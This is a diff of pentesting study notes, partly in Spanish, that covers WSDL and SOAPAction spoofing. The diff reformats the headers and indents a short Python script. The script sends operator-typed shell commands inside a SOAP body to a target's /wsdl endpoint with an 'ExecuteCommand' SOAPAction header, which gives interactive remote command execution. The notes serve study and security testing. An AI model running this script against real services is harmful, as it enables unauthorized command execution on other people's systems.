@@ -1,14 +1,14 @@
 
 
 
-###################WSDL
+### WSDL
 
 Los WSDL son xmls que informan de los metodos disponibilizados, la forma de llamarlos y dónde residen
 
 
-##################SOAP
+### SOAP
 
-##########Soap Action Spoofing
+#### Soap Action Spoofing
 SOAP messages towards a SOAP service should include both the operation and the related parameters. 
 This operation resides in the first child element of the SOAP message's body. If HTTP is the transport of choice, it is allowed 
 to use an additional HTTP header called SOAPAction, which contains the operation's name. The receiving web service can identify 
@@ -19,12 +19,12 @@ SOAPAction spoofing.
 
 ejemplo de soapaction spoofin:
 
-import requests
+        import requests
 
-while True:
-    cmd = input("$ ")
-    payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>{cmd}</cmd></LoginRequest></soap:Body></soap:Envelope>'
-    print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
+        while True:
+            cmd = input("$ ")
+            payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>{cmd}</cmd></LoginRequest></soap:Body></soap:Envelope>'
+            print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
 
 
 ########################### Information disclosure
